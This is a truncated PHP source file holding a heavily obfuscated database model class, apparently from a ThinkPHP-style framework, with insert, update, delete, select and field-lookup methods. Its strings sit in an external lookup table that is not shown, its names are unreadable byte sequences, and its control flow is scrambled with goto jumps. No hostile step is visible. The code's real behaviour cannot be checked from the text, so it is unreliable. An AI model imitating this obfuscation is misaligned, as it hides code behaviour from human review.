define($_SERVER[Ä¿¡‡öóµŸﬂ‡][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\x72\144\145\162", "\x61\154\x69\141\x73", "\150\141\x76\151\x6e\147", "\147\162\x6f\165\x70", "\154\x6f\x63\153", "\x64\x69\163\x74\x69\x6e\x63\164", "\141\x75\x74\x6f", "\146\x69\154\164\145\x72", "\166\x61\154\151\144\141\x74\145", "\x72\145\x73\165\x6c\164", "\x62\151\156\x64", "\164\157\153\x65\156"); public function __construct($d„◊‹ÍÉ°• = '', $E¢ßÌÇ„‡û = '', $cò›≤‚˜±ê = '') { $eî‚⁄¯≠Êá =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->_initialize(); if (!empty($d„◊‹ÍÉ°•)) { if (strpos($d„◊‹ÍÉ°•, $eî‚⁄¯≠Êá[91])) { list($this->dbName, $this->name) = explode($eî‚⁄¯≠Êá[91], $d„◊‹ÍÉ°•); } else { $this->name = $d„◊‹ÍÉ°•; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($E¢ßÌÇ„‡û)) { $this->tablePrefix = $eî‚⁄¯≠Êá[33]; } elseif ($eî‚⁄¯≠Êá[33] != $E¢ßÌÇ„‡û) { $this->tablePrefix = $E¢ßÌÇ„‡û; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($eî‚⁄¯≠Êá[232]); } $this->db(0, empty($this->connection) ? $cò›≤‚˜±ê : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EÉì£÷…´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($this->fields)) { if (think_config($EÉì£÷…´[233])) { $Dû˜ÜûıìÈ = $this->dbName ? $this->dbName : think_config($EÉì£÷…´[234]); $BåŒÑé≈À∏ = think_var_cache($EÉì£÷…´[235] . strtolower(get_path_this($Dû˜ÜûıìÈ) . $EÉì£÷…´[91] . $this->name)); if ($BåŒÑé≈À∏) { $A∞√õÙûø = think_config($EÉì£÷…´[236]); if (empty($A∞√õÙûø) || $BåŒÑé≈À∏[$EÉì£÷…´[237]] == $A∞√õÙûø) { $this->fields = $BåŒÑé≈À∏; return; } } } $this->flush(); } } public function flush() { goto Dª«ÒàéπË; aŒ¡õ€®∏: foreach ($Bﬂ’Üñë‚· as $EÕÏºπúÑ÷ => $fÀí≥•À»å) { $aô≤òŒàîﬂ[$EÕÏºπúÑ÷] = $fÀí≥•À»å[$D€∫©¿£âŒ[29]]; if ($fÀí≥•À»å[$D€∫©¿£âŒ[36]]) { $this->fields[$D€∫©¿£âŒ[239]] = $EÕÏºπúÑ÷; if ($fÀí≥•À»å[$D€∫©¿£âŒ[39]]) { $this->fields[$D€∫©¿£âŒ[238]] = !0; } } } $this->fields[$D€∫©¿£âŒ[240]] = $aô≤òŒàîﬂ; if (think_config($D€∫©¿£âŒ[236])) { $this->fields[$D€∫©¿£âŒ[237]] = think_config($D€∫©¿£âŒ[236]); } goto Fºù˘ÉÒöÙ; a≈Ÿ∆ñ°ï±: if (!$Bﬂ’Üñë‚·) { return !1; } $this->fields = array_keys($Bﬂ’Üñë‚·); $this->fields[$D€∫©¿£âŒ[238]] = !1; goto aŒ¡õ€®∏; Fºù˘ÉÒöÙ: if (think_config($D€∫©¿£âŒ[233])) { $fÊ¨ôè‡÷à = $this->dbName ? $this->dbName : think_config($D€∫©¿£âŒ[234]); think_var_cache($D€∫©¿£âŒ[235] . strtolower(get_path_this($fÊ¨ôè‡÷à) . $D€∫©¿£âŒ[91] . $this->name), $this->fields); } goto Bÿâøã†∑§; Dª«ÒàéπË: $D€∫©¿£âŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->db->setModel($this->name); $Bﬂ’Üñë‚· = $this->db->getFields($this->getTableName()); goto a≈Ÿ∆ñ°ï±; Bÿâøã†∑§: } public function switchModel($dÀÇ¨Ç±”‹, $E€®äÙ⁄°Í = array()) { $dãßŸõÙªÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aŸ•ÃÖﬂπõ = ucwords(strtolower($dÀÇ¨Ç±”‹)) . $dãßŸõÙªÔ[241]; if (!class_exists($aŸ•ÃÖﬂπõ)) { think_exception($aŸ•ÃÖﬂπõ . think_lang($dãßŸõÙªÔ[242])); } $this->_extModel = new $aŸ•ÃÖﬂπõ($this->name); if (!empty($E€®äÙ⁄°Í)) { foreach ($E€®äÙ⁄°Í as $C⁄±í◊…ºò) { $this->_extModel->setProperty($C⁄±í◊…ºò, $this->{$C⁄±í◊…ºò}); } } return $this->_extModel; } public function __set($Aóöö„≈áÚ, $cÂÑ”«Á∫é) { $this->data[$Aóöö„≈áÚ] = $cÂÑ”«Á∫é; } public function __get($aâÑœ°Ñ’∏) { return isset($this->data[$aâÑœ°Ñ’∏]) ? $this->data[$aâÑœ°Ñ’∏] : null; } public function __isset($a¿äÀ≤õçå) { return isset($this->data[$a¿äÀ≤õçå]); } public function __unset($BÌíÀêÌ÷ò) { unset($this->data[$BÌíÀêÌ÷ò]); } public function __call($F∂”πåÀÀ, $aùÇﬂ∆¿§Î) { $bñ√™Ò‡´Œ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (in_array(strtolower($F∂”πåÀÀ), $this->methods, !0)) { $this->options[strtolower($F∂”πåÀÀ)] = $aùÇﬂ∆¿§Î[0]; return $this; } elseif (in_array(strtolower($F∂”πåÀÀ), array($bñ√™Ò‡´Œ[243], $bñ√™Ò‡´Œ[244], $bñ√™Ò‡´Œ[245], $bñ√™Ò‡´Œ[246], $bñ√™Ò‡´Œ[247]), !0)) { $aé¿Ë≈ëà‰ = isset($aùÇﬂ∆¿§Î[0]) ? $aùÇﬂ∆¿§Î[0] : $bñ√™Ò‡´Œ[176]; $aé¿Ë≈ëà‰ = $this->db->parseKey($aé¿Ë≈ëà‰); return $this->getField(strtoupper($F∂”πåÀÀ) . $bñ√™Ò‡´Œ[248] . $aé¿Ë≈ëà‰ . $bñ√™Ò‡´Œ[249] . $F∂”πåÀÀ, $bñ√™Ò‡´Œ[243]); } elseif (strtolower(substr($F∂”πåÀÀ, 0, 5)) == $bñ√™Ò‡´Œ[250]) { $aé¿Ë≈ëà‰ = think_parse_name(substr($F∂”πåÀÀ, 5)); $Eí⁄áµûı≈[$aé¿Ë≈ëà‰] = $aùÇﬂ∆¿§Î[0]; return $this->where($Eí⁄áµûı≈)->find(); } elseif (strtolower(substr($F∂”πåÀÀ, 0, 10)) == $bñ√™Ò‡´Œ[251]) { $EÇÈ§È¥ºŒ = think_parse_name(substr($F∂”πåÀÀ, 10)); $Eí⁄áµûı≈[$EÇÈ§È¥ºŒ] = $aùÇﬂ∆¿§Î[0]; return $this->where($Eí⁄áµûı≈)->getField($aùÇﬂ∆¿§Î[1]); } elseif (isset($this->_scope[$F∂”πåÀÀ])) { return $this->scope($F∂”πåÀÀ, $aùÇﬂ∆¿§Î[0]); } elseif (method_exists($this, $F∂”πåÀÀ)) { array_unshift($aùÇﬂ∆¿§Î, $F∂”πåÀÀ); return call_user_func_array(array($this, $bñ√™Ò‡´Œ[252]), $aùÇﬂ∆¿§Î); } else { return call_user_func_array(array(parent, $F∂”πåÀÀ), $aùÇﬂ∆¿§Î); } } protected function call() { goto BùÖÆ«¢†‰; DŸ˜Ï¥»°÷: $Aˆ¯ùúÆ‰„ = $c£’™ˆå–≠; if (is_array($c£’™ˆå–≠)) { $Aˆ¯ùúÆ‰„ = $c£’™ˆå–≠[1]; $c£’™ˆå–≠ = $c£’™ˆå–≠[0]; } $BëÓëßÚΩ¨ = count($fè≥äÁÑ§Ñ) - 1; goto e∫◊≠√Ü°´; BùÖÆ«¢†‰: $dªì¶ºÎñó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fè≥äÁÑ§Ñ = func_get_args(); $c£’™ˆå–≠ = array_shift($fè≥äÁÑ§Ñ); goto DŸ˜Ï¥»°÷; e¬‹ ÊÆ¢û: $bâªÓé÷Ωı = call_user_func_array(array($this, $c£’™ˆå–≠), $fè≥äÁÑ§Ñ); if (method_exists($this, $dªì¶ºÎñó[256])) { $C•‘òûõ¥‡ = call_user_func_array(array($this, $dªì¶ºÎñó[257]), array($Aˆ¯ùúÆ‰„, $fè≥äÁÑ§Ñ, $bâªÓé÷Ωı)); if ($C•‘òûõ¥‡) { return $C•‘òûõ¥‡; } } return $bâªÓé÷Ωı; goto fóöêÈÉ»Ê; e∫◊≠√Ü°´: if (isset($fè≥äÁÑ§Ñ[$BëÓëßÚΩ¨]) && $fè≥äÁÑ§Ñ[$BëÓëßÚΩ¨] === $c£’™ˆå–≠) { think_exception(__CLASS__ . $dªì¶ºÎñó[4] . $c£’™ˆå–≠ . think_lang($dªì¶ºÎñó[253])); return; } $fè≥äÁÑ§Ñ[] = $c£’™ˆå–≠; if (method_exists($this, $dªì¶ºÎñó[254])) { $C•‘òûõ¥‡ = call_user_func_array(array($this, $dªì¶ºÎñó[255]), array($Aˆ¯ùúÆ‰„, $fè≥äÁÑ§Ñ)); if (!is_null($C•‘òûõ¥‡) && $C•‘òûõ¥‡ !== !1) { return $C•‘òûõ¥‡; } } goto e¬‹ ÊÆ¢û; fóöêÈÉ»Ê: } protected function _initialize() { } protected function _facade($Eéã©Ã∏ïê) { $eâ—È∆ä€ë =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($this->fields)) { foreach ($Eéã©Ã∏ïê as $A∂“äçÚê” => $fùõ≤πàæà) { if (!in_array($A∂“äçÚê”, $this->fields, !0)) { unset($Eéã©Ã∏ïê[$A∂“äçÚê”]); } elseif (is_scalar($fùõ≤πàæà)) { $this->_parseType($Eéã©Ã∏ïê, $A∂“äçÚê”); } } } if (!empty($this->options[$eâ—È∆ä€ë[258]])) { $Eéã©Ã∏ïê = array_map($this->options[$eâ—È∆ä€ë[258]], $Eéã©Ã∏ïê); unset($this->options[$eâ—È∆ä€ë[258]]); } $this->_beforeWrite($Eéã©Ã∏ïê); return $Eéã©Ã∏ïê; } protected function _beforeWrite(&$AÜ®≠£Ÿã) { } public function add($F…‡¯ÊèçÇ = '', $Dåêïåú√· = array(), $D•ˆïê éÿ = false) { goto fá≠ﬂ∞ä¡Ç; b®¿ü†¥‚Í: if (!1 === $this->_beforeInsert($F…‡¯ÊèçÇ, $Dåêïåú√·)) { return !1; } $Cäç©∏‡ßß = $this->db->insert($F…‡¯ÊèçÇ, $Dåêïåú√·, $D•ˆïê éÿ); if (!1 !== $Cäç©∏‡ßß) { $B¥Áá±ç”è = $this->getLastInsID(); if ($B¥Áá±ç”è) { $F…‡¯ÊèçÇ[$this->getPk()] = $B¥Áá±ç”è; $this->_after_insert($F…‡¯ÊèçÇ, $Dåêïåú√·); return $B¥Áá±ç”è; } $this->_after_insert($F…‡¯ÊèçÇ, $Dåêïåú√·); } goto d≥˘Öú¶åâ; fá≠ﬂ∞ä¡Ç: if (empty($F…‡¯ÊèçÇ)) { if (!empty($this->data)) { $F…‡¯ÊèçÇ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ä¿¡‡öóµŸﬂ‡][259]); return !1; } } $Dåêïåú√· = $this->_parseOptions($Dåêïåú√·); $F…‡¯ÊèçÇ = $this->_facade($F…‡¯ÊèçÇ); goto b®¿ü†¥‚Í; d≥˘Öú¶åâ: return $Cäç©∏‡ßß; goto f∏”ãÜ’Üµ; f∏”ãÜ’Üµ: } protected function _beforeInsert(&$B¨ıÕê∞§ü, $CÙﬁ≤ŒÀóµ) { } protected function _after_insert($a‚’à≠õÙ≈, $FÖô◊Ê‹Â≥) { } public function addAll($a◊ﬁ≈∫¡éê, $bâä≤–£ä∆ = array(), $DÉ¨≠–ÎÁ” = false) { goto C†Ï‚•äß¥; E“êÜÒ´˜∏: return $b»˜ªı§Ö∑; goto B‚°∑ÃÇôí; fœ¶–ÂÌ≈ö: foreach ($a◊ﬁ≈∫¡éê as $cÈ„úòß≤¿ => $AÚßÒä•∂Ò) { $a◊ﬁ≈∫¡éê[$cÈ„úòß≤¿] = $this->_facade($AÚßÒä•∂Ò); } if (method_exists($this->db, $CË¶æÿ◊œ†[260])) { $b»˜ªı§Ö∑ = $this->db->insertAll($a◊ﬁ≈∫¡éê, $bâä≤–£ä∆, $DÉ¨≠–ÎÁ”); } else { $this->startTrans(); foreach ($a◊ﬁ≈∫¡éê as $cÈ„úòß≤¿ => $AÚßÒä•∂Ò) { $b»˜ªı§Ö∑ = $this->db->insert($AÚßÒä•∂Ò, $bâä≤–£ä∆, $DÉ¨≠–ÎÁ”); } $this->commit(); } if (!1 !== $b»˜ªı§Ö∑) { $A”∫£Ω§Î = $this->getLastInsID(); if ($A”∫£Ω§Î) { return $A”∫£Ω§Î; } } goto E“êÜÒ´˜∏; C†Ï‚•äß¥: $CË¶æÿ◊œ† =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($a◊ﬁ≈∫¡éê)) { $this->error = think_lang($CË¶æÿ◊œ†[259]); return !1; } $bâä≤–£ä∆ = $this->_parseOptions($bâä≤–£ä∆); goto fœ¶–ÂÌ≈ö; B‚°∑ÃÇôí: } public function selectAdd($dÃï“Ô≤¡ú = '', $bö±©∫©î– = '', $d·”ù≥ë· = array()) { $búà¥·û‚  =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d·”ù≥ë· = $this->_parseOptions($d·”ù≥ë·); if (!1 === ($b¢µìè‘‚» = $this->db->selectInsert($dÃï“Ô≤¡ú ? $dÃï“Ô≤¡ú : $d·”ù≥ë·[$búà¥·û‚ [261]], $bö±©∫©î– ? $bö±©∫©î– : $this->getTableName(), $d·”ù≥ë·))) { $this->error = think_lang($búà¥·û‚ [262]); return !1; } else { return $b¢µìè‘‚»; } } public function save($B∏”Ìêèâ„ = '', $aﬂﬁÃúﬁ•€ = array()) { goto eÿÀÃ«–Ñı; D”ÿßæ”µÀ: $aﬂﬁÃúﬁ•€ = $this->_parseOptions($aﬂﬁÃúﬁ•€); $FŒ’ôÕ¿Ï’ = $this->getPk(); if (!isset($aﬂﬁÃúﬁ•€[$f√Î§Ëè™ı[263]])) { if (isset($B∏”Ìêèâ„[$FŒ’ôÕ¿Ï’])) { $fÓ∆Ê¶¢≠∫[$FŒ’ôÕ¿Ï’] = $B∏”Ìêèâ„[$FŒ’ôÕ¿Ï’]; $aﬂﬁÃúﬁ•€[$f√Î§Ëè™ı[263]] = $fÓ∆Ê¶¢≠∫; unset($B∏”Ìêèâ„[$FŒ’ôÕ¿Ï’]); } else { $this->error = think_lang($f√Î§Ëè™ı[262]); return !1; } } goto BÌ—áå±àã; eÿÀÃ«–Ñı: $f√Î§Ëè™ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($B∏”Ìêèâ„)) { if (!empty($this->data)) { $B∏”Ìêèâ„ = $this->data; $this->data = array(); } else { $this->error = think_lang($f√Î§Ëè™ı[259]); return !1; } } $B∏”Ìêèâ„ = $this->_facade($B∏”Ìêèâ„); goto D”ÿßæ”µÀ; BÌ—áå±àã: if (is_array($aﬂﬁÃúﬁ•€[$f√Î§Ëè™ı[263]]) && isset($aﬂﬁÃúﬁ•€[$f√Î§Ëè™ı[263]][$FŒ’ôÕ¿Ï’])) { $CòÀØÑ˘◊ = $aﬂﬁÃúﬁ•€[$f√Î§Ëè™ı[263]][$FŒ’ôÕ¿Ï’]; } if (!1 === $this->_beforeUpdate($B∏”Ìêèâ„, $aﬂﬁÃúﬁ•€)) { return !1; } $Aè£¨ŒçÈπ = $this->db->update($B∏”Ìêèâ„, $aﬂﬁÃúﬁ•€); goto F´…”í·¶Ø; F´…”í·¶Ø: if (!1 !== $Aè£¨ŒçÈπ) { if (isset($CòÀØÑ˘◊)) { $B∏”Ìêèâ„[$FŒ’ôÕ¿Ï’] = $CòÀØÑ˘◊; } $this->_afterUpdate($B∏”Ìêèâ„, $aﬂﬁÃúﬁ•€); } return $Aè£¨ŒçÈπ; goto C•È©ÖàÍ¿; C•È©ÖàÍ¿: } protected function _beforeUpdate(&$eçæåﬂªõ›, $cåÒòÕâΩÓ) { } protected function _afterUpdate($cºõáãœ°Ù, $E‚©âÜàÇ‘) { } public function delete($bßÛÙÊÜƒÀ = array()) { goto EΩﬁÀ∂∞ªâ; EΩﬁÀ∂∞ªâ: $f±®ØÃèÓ· =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($bßÛÙÊÜƒÀ) && empty($this->options[$f±®ØÃèÓ·[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $d…∂â´“ò≠ = $this->getPk(); goto f§ä¶ú˜±°; f§ä¶ú˜±°: if (is_numeric($bßÛÙÊÜƒÀ) || is_string($bßÛÙÊÜƒÀ)) { if (strpos($bßÛÙÊÜƒÀ, $f±®ØÃèÓ·[47])) { $D““ÑâóåÇ[$d…∂â´“ò≠] = array($f±®ØÃèÓ·[264], $bßÛÙÊÜƒÀ); } else { $D““ÑâóåÇ[$d…∂â´“ò≠] = $bßÛÙÊÜƒÀ; } $this->options[$f±®ØÃèÓ·[263]] = $D““ÑâóåÇ; } $bßÛÙÊÜƒÀ = $this->_parseOptions(); if (is_array($bßÛÙÊÜƒÀ[$f±®ØÃèÓ·[263]]) && isset($bßÛÙÊÜƒÀ[$f±®ØÃèÓ·[263]][$d…∂â´“ò≠])) { $CıÀ¥ÙúÕ = $bßÛÙÊÜƒÀ[$f±®ØÃèÓ·[263]][$d…∂â´“ò≠]; } goto B¬Ê¡ ÈÖÕ; B¬Ê¡ ÈÖÕ: $C⁄ÎµòäÁ≥ = $this->db->delete($bßÛÙÊÜƒÀ); if (!1 !== $C⁄ÎµòäÁ≥) { $bèàŒËë∏º = array(); if (isset($CıÀ¥ÙúÕ)) { $bèàŒËë∏º[$d…∂â´“ò≠] = $CıÀ¥ÙúÕ; } $this->_after_delete($bèàŒËë∏º, $bßÛÙÊÜƒÀ); } return $C⁄ÎµòäÁ≥; goto DÒçœ°◊®Ì; DÒçœ°◊®Ì: } protected function _after_delete($E¡ÿ∑ΩÕÇƒ, $B¢›≤∆áØÿ) { } public function select($dﬁ©ÖÛñ¯∑ = array()) { goto e‹À£Ô±∑–; Bã”¥∂éÜÖ: $this->_afterSelect($b“Ê‚Œ·Ö˜, $dﬁ©ÖÛñ¯∑); return $b“Ê‚Œ·Ö˜; goto D•ñáÕ£“¡; Fàûêú…£ˆ: $b“Ê‚Œ·Ö˜ = $this->db->select($dﬁ©ÖÛñ¯∑); if (!1 === $b“Ê‚Œ·Ö˜) { return !1; } if (empty($b“Ê‚Œ·Ö˜)) { return null; } goto Bã”¥∂éÜÖ; e‹À£Ô±∑–: $CÖØ≈©ÿ∏¬ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_string($dﬁ©ÖÛñ¯∑) || is_numeric($dﬁ©ÖÛñ¯∑)) { $AŒ‚∑Ö±∂ì = $this->getPk(); if (strpos($dﬁ©ÖÛñ¯∑, $CÖØ≈©ÿ∏¬[47])) { $A˜∏ó…ﬂ«®[$AŒ‚∑Ö±∂ì] = array($CÖØ≈©ÿ∏¬[264], $dﬁ©ÖÛñ¯∑); } else { $A˜∏ó…ﬂ«®[$AŒ‚∑Ö±∂ì] = $dﬁ©ÖÛñ¯∑; } $this->options[$CÖØ≈©ÿ∏¬[263]] = $A˜∏ó…ﬂ«®; } elseif (!1 === $dﬁ©ÖÛñ¯∑) { $dﬁ©ÖÛñ¯∑ = $this->_parseOptions(); return $CÖØ≈©ÿ∏¬[265] . $this->db->buildSelectSql($dﬁ©ÖÛñ¯∑) . $CÖØ≈©ÿ∏¬[266]; } $dﬁ©ÖÛñ¯∑ = $this->_parseOptions(); goto Fàûêú…£ˆ; D•ñáÕ£“¡: } protected function _afterSelect(&$cµ¯Ìáµ»î, $A±∆«Ï∂≥Î) { } public function buildSql($EïµÀ≠®◊ç = array()) { $cñô¢Êá¥Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $EïµÀ≠®◊ç = $this->_parseOptions($EïµÀ≠®◊ç); return $cñô¢Êá¥Ñ[265] . $this->db->buildSelectSql($EïµÀ≠®◊ç) . $cñô¢Êá¥Ñ[266]; } public function optionsValue($AÒÖÜ±•è° = null) { if (is_null($AÒÖÜ±•è°)) { return $this->options; } elseif (is_array($AÒÖÜ±•è°)) { $this->options = array_merge($this->options, $AÒÖÜ±•è°); } } protected function _parseOptions($e—êÏºë†ç = array()) { goto dÍ´ËìÜ¨é; aÛüπ™¯¢°: if (!isset($e—êÏºë†ç[$b√“ÀÙ¡≥ç[267]])) { $e—êÏºë†ç[$b√“ÀÙ¡≥ç[267]] = $this->getTableName(); $e˜Ï∫∫Ò« = $this->fields; } else { $e˜Ï∫∫Ò« = $this->getDbFields(); } if (!empty($e—êÏºë†ç[$b√“ÀÙ¡≥ç[268]])) { $e—êÏºë†ç[$b√“ÀÙ¡≥ç[267]] .= $b√“ÀÙ¡≥ç[50] . $e—êÏºë†ç[$b√“ÀÙ¡≥ç[268]]; } $e—êÏºë†ç[$b√“ÀÙ¡≥ç[269]] = $this->name; goto AÏÓ‰ıΩÈó; dÍ´ËìÜ¨é: $b√“ÀÙ¡≥ç =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_array($e—êÏºë†ç)) { $e—êÏºë†ç = array_merge($this->options, $e—êÏºë†ç); } $this->options = array(); goto aÛüπ™¯¢°; AÏÓ‰ıΩÈó: if (isset($e—êÏºë†ç[$b√“ÀÙ¡≥ç[263]]) && is_array($e—êÏºë†ç[$b√“ÀÙ¡≥ç[263]]) && !empty($e˜Ï∫∫Ò«) && !isset($e—êÏºë†ç[$b√“ÀÙ¡≥ç[270]]) && !isset($e—êÏºë†ç[$b√“ÀÙ¡≥ç[267]])) { foreach ($e—êÏºë†ç[$b√“ÀÙ¡≥ç[263]] as $Fó™¨ÌåëÒ => $C√Çó¿è¯û) { $Fó™¨ÌåëÒ = trim($Fó™¨ÌåëÒ); if (in_array($Fó™¨ÌåëÒ, $e˜Ï∫∫Ò«, !0)) { if (is_scalar($C√Çó¿è¯û)) { $this->_parseType($e—êÏºë†ç[$b√“ÀÙ¡≥ç[263]], $Fó™¨ÌåëÒ); } } elseif (!is_numeric($Fó™¨ÌåëÒ) && $b√“ÀÙ¡≥ç[70] != substr($Fó™¨ÌåëÒ, 0, 1) && !1 === strpos($Fó™¨ÌåëÒ, $b√“ÀÙ¡≥ç[91]) && !1 === strpos($Fó™¨ÌåëÒ, $b√“ÀÙ¡≥ç[248]) && !1 === strpos($Fó™¨ÌåëÒ, $b√“ÀÙ¡≥ç[271]) && !1 === strpos($Fó™¨ÌåëÒ, $b√“ÀÙ¡≥ç[272])) { unset($e—êÏºë†ç[$b√“ÀÙ¡≥ç[263]][$Fó™¨ÌåëÒ]); } } } $this->_options_filter($e—êÏºë†ç); return $e—êÏºë†ç; goto cç≠·Ê•ÿñ; cç≠·Ê•ÿñ: } protected function _options_filter(&$aã»‚∆ÿ°ª) { } protected function _parseType(&$b≥∂„œ≠æ©, $A≥áÕç Î‚) { $Cé√≠‘…çí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (empty($this->options[$Cé√≠‘…çí[273]][$Cé√≠‘…çí[4] . $A≥áÕç Î‚])) { $eäÏÇ∏ÌÈı = strtolower($this->fields[$Cé√≠‘…çí[240]][$A≥áÕç Î‚]); if (!1 !== strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[274])) { } elseif (!1 === strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[275]) && !1 !== strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[276])) { $b≥∂„œ≠æ©[$A≥áÕç Î‚] = intval($b≥∂„œ≠æ©[$A≥áÕç Î‚]); } elseif (!1 !== strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[277]) || !1 !== strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[278])) { $b≥∂„œ≠æ©[$A≥áÕç Î‚] = floatval($b≥∂„œ≠æ©[$A≥áÕç Î‚]); } elseif (!1 !== strpos($eäÏÇ∏ÌÈı, $Cé√≠‘…çí[279])) { $b≥∂„œ≠æ©[$A≥áÕç Î‚] = (bool) $b≥∂„œ≠æ©[$A≥áÕç Î‚]; } } } public function find($b⁄ıõ¯§ÀÊ = array()) { goto CÒº„åΩ—∆; A“ô‰›àãï: if (!empty($this->options[$aÁû∏ü≠õΩ[281]])) { return $this->returnResult($this->data, $this->options[$aÁû∏ü≠õΩ[281]]); } return $this->data; goto có  ¯“ÿì; E÷¢ø«≥º–: $b⁄ıõ¯§ÀÊ = $this->_parseOptions(); $EªÛÚÊ∞„ı = $this->db->select($b⁄ıõ¯§ÀÊ); if (!1 === $EªÛÚÊ∞„ı) { return !1; } goto f∫ËÉ‡≠ûÖ; CÒº„åΩ—∆: $aÁû∏ü≠õΩ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (is_numeric($b⁄ıõ¯§ÀÊ) || is_string($b⁄ıõ¯§ÀÊ)) { $Eå∫æÁú∆[$this->getPk()] = intval($b⁄ıõ¯§ÀÊ); $this->options[$aÁû∏ü≠õΩ[263]] = $Eå∫æÁú∆; } $this->options[$aÁû∏ü≠õΩ[280]] = 1; goto E÷¢ø«≥º–; f∫ËÉ‡≠ûÖ: if (empty($EªÛÚÊ∞„ı)) { return null; } $this->data = $EªÛÚÊ∞„ı[0]; $this->_afterFind($this->data, $b⁄ıõ¯§ÀÊ); goto A“ô‰›àãï; có  ¯“ÿì: } protected function _afterFind(&$b±ÒäÓıñ«, $Càﬁ†´¢¢ê) { } protected function returnResult($cõè†±∞πç, $CùºøÔœıâ = '') { $D›à¯ÖÊˆê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($CùºøÔœıâ) { if (is_callable($CùºøÔœıâ)) { return call_user_func($CùºøÔœıâ, $cõè†±∞πç); } switch (strtolower($CùºøÔœıâ)) { case $D›à¯ÖÊˆê[282]: return json_encode($cõè†±∞πç); case $D›à¯ÖÊˆê[283]: return xml_encode($cõè†±∞πç); } } return $cõè†±∞πç; } public function parseFieldsMap($E¶ä´∂®Î∂, $a©»¥·¢äí = 1) { if (!empty($this->_map)) { foreach ($this->_map as $dÊü‚îÆË· => $FÒ«◊«∂≠⁄) { if ($a©»¥·¢äí == 1) { if (isset($E¶ä´∂®Î∂[$FÒ«◊«∂≠⁄])) { $E¶ä´∂®Î∂[$dÊü‚îÆË·] = $E¶ä´∂®Î∂[$FÒ«◊«∂≠⁄]; unset($E¶ä´∂®Î∂[$FÒ«◊«∂≠⁄]); } } else { if (isset($E¶ä´∂®Î∂[$dÊü‚îÆË·])) { $E¶ä´∂®Î∂[$FÒ«◊«∂≠⁄] = $E¶ä´∂®Î∂[$dÊü‚îÆË·]; unset($E¶ä´∂®Î∂[$dÊü‚îÆË·]); } } } } return $E¶ä´∂®Î∂; } public function setField($Fÿ∞‚Æ∫ëô, $AŸã›’≈ÇŒ = '') { if (is_array($Fÿ∞‚Æ∫ëô)) { $Fæ ã©‹€– = $Fÿ∞‚Æ∫ëô; } else { $Fæ ã©‹€–[$Fÿ∞‚Æ∫ëô] = $AŸã›’≈ÇŒ; } return $this->save($Fæ ã©‹€–); } public function setAdd($bŸ–≥·ËÂ†, $cÙËüíƒë• = 1) { $c≤∏›ŒèÊË =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c√ŸµöâÇ∑ = $bŸ–≥·ËÂ† . $c≤∏›ŒèÊË[284] . $cÙËüíƒë•; if ($cÙËüíƒë• < 0) { $c√ŸµöâÇ∑ = $bŸ–≥·ËÂ† . $cÙËüíƒë•; } return $this->setField($bŸ–≥·ËÂ†, array($c≤∏›ŒèÊË[285], $c√ŸµöâÇ∑)); } public function getField($eÏ◊ªÀÚÉõ, $Cˆ∑„®Ú“¡ = null) { $aÃßÌ†í“å =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D Ò‰˜ö˘Á[$aÃßÌ†í“å[261]] = $eÏ◊ªÀÚÉõ; $D Ò‰˜ö˘Á = $this->_parseOptions($D Ò‰˜ö˘Á); $eÏ◊ªÀÚÉõ = trim($eÏ◊ªÀÚÉõ); if (strpos($eÏ◊ªÀÚÉõ, $aÃßÌ†í“å[47])) { if (!isset($D Ò‰˜ö˘Á[$aÃßÌ†í“å[280]])) { $D Ò‰˜ö˘Á[$aÃßÌ†í“å[280]] = is_numeric($Cˆ∑„®Ú“¡) ? $Cˆ∑„®Ú“¡ : $aÃßÌ†í“å[33]; } $bö»ä⁄Ñº“ = $this->db->select($D Ò‰˜ö˘Á); if (!empty($bö»ä⁄Ñº“)) { goto eù™Ö§ïò; eù™Ö§ïò: $Eàá›∏°†˘ = explode($aÃßÌ†í“å[47], $eÏ◊ªÀÚÉõ); $eÏ◊ªÀÚÉõ = array_keys($bö»ä⁄Ñº“[0]); $Då„≈ñÃóΩ = array_shift($eÏ◊ªÀÚÉõ); goto B¿¯Ã„≤ö÷; B¿¯Ã„≤ö÷: $aàπåïî√é = array_shift($eÏ◊ªÀÚÉõ); $aì¯ŒäöÂﬁ = array(); $aíÉ¢ïõéı = count($Eàá›∏°†˘); goto aŒè∞ÇåÜÉ; aŒè∞ÇåÜÉ: foreach 